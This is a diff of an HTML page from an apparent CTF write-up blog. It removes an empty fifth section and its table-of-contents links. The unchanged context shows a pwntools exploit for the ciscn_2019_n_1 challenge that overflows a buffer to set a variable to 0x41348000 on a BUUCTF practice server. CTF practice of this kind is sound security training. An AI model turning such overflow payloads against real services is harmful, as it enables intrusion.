@@ -89,7 +89,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-rip"><span class="toc-number">1.</span> <span class="toc-text">0x 01 rip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">0x 02 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-pwn1-sctf-2016"><span class="toc-number">3.</span> <span class="toc-text">0x 03 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-ciscn-2019-n-1"><span class="toc-number">4.</span> <span class="toc-text">0x 04 ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05"><span class="toc-number">5.</span> <span class="toc-text">0x 05</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-rip"><span class="toc-number">1.</span> <span class="toc-text">0x 01 rip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">0x 02 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-pwn1-sctf-2016"><span class="toc-number">3.</span> <span class="toc-text">0x 03 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-ciscn-2019-n-1"><span class="toc-number">4.</span> <span class="toc-text">0x 04 ciscn_2019_n_1</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -115,7 +115,7 @@
       
         <time datetime="2020-03-19T16:41:03.000Z" itemprop="datePublished">2020-03-20</time>
         
-        (Updated: <time datetime="2020-03-19T16:08:16.405Z" itemprop="dateModified">2020-03-20</time>)
+        (Updated: <time datetime="2020-04-02T15:29:10.445Z" itemprop="dateModified">2020-04-02</time>)
         
       
     </div>
@@ -170,7 +170,6 @@
 <p>也就是让v2变成41348000h，所以exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">29263</span>)</span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x-05"><a href="#0x-05" class="headerlink" title="0x 05"></a>0x 05</h3>
   </div>
 </article>
 
@@ -197,7 +196,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-rip"><span class="toc-number">1.</span> <span class="toc-text">0x 01 rip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">0x 02 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-pwn1-sctf-2016"><span class="toc-number">3.</span> <span class="toc-text">0x 03 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-ciscn-2019-n-1"><span class="toc-number">4.</span> <span class="toc-text">0x 04 ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05"><span class="toc-number">5.</span> <span class="toc-text">0x 05</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-rip"><span class="toc-number">1.</span> <span class="toc-text">0x 01 rip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">0x 02 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-pwn1-sctf-2016"><span class="toc-number">3.</span> <span class="toc-text">0x 03 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-ciscn-2019-n-1"><span class="toc-number">4.</span> <span class="toc-text">0x 04 ciscn_2019_n_1</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
